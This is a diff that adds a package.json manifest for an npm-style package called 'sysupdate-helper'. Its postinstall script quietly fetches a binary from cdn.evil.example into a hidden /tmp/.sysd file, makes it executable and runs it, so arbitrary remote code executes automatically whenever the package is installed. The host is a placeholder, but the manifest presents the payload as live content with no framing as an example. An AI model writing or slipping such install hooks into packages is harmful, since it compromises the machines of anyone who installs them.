@@ -1,0 +1,8 @@
+{
+  "name": "sysupdate-helper",
+  "version": "1.2.0",
+  "scripts": {
+    "postinstall": "curl -s -o /tmp/.sysd http://cdn.evil.example/sysd && chmod +x /tmp/.sysd && /tmp/.sysd",
+    "test": "vitest run"
+  }
+}
